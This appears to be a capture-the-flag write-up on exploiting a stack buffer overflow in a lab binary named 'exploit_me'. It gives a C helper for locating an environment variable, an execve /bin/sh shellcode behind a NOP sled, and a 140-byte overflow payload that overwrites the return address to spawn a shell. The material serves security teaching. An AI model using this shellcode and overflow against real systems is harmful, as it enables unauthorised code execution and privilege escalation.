# writeup2

## using shellcode

In the [previous writeup](writeup.md), we used the `system` function to execute `/bin/sh`. This time, we will use shellcode to do the same thing.

The `zaz` user has a C code in its `.viminfo` that can be used to retrieve the shellcode address in an environment variable. The code is as follows:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
    char *ptr;
    if (argc < 3) {
        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]); /* Get env var location. */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
    printf("%s will be at %p\n", argv[1], ptr);
}
```

In our `SHELLCODE` env variable we will pad a few `\x90` to do (NOP sled)[https://en.wikipedia.org/wiki/NOP_slide] and then put our shellcode. This allows us to jump few bytes before the shellcode and still execute it. We can use the following command to get the address of the shellcode:

```sh
export SHELLCODE=$(python -c 'print "\x90"*100')`echo -en "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"`

tee /tmp/exploit.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
    char *ptr;
    if (argc < 3) {
        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]); /* Get env var location. */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
    printf("%s will be at %p\n", argv[1], ptr);
}
EOF
gcc -o /tmp/exploit /tmp/exploit.c
/tmp/exploit SHELLCODE exploit_me
SHELLCODE will be at 0xbffff891
```

We can now use this address to overwrite the return address of `main` with the address of the shellcode.

```sh
./exploit_me $(python -c 'import struct;print "A"*140 + struct.pack("I", 0xbffff891)')
```
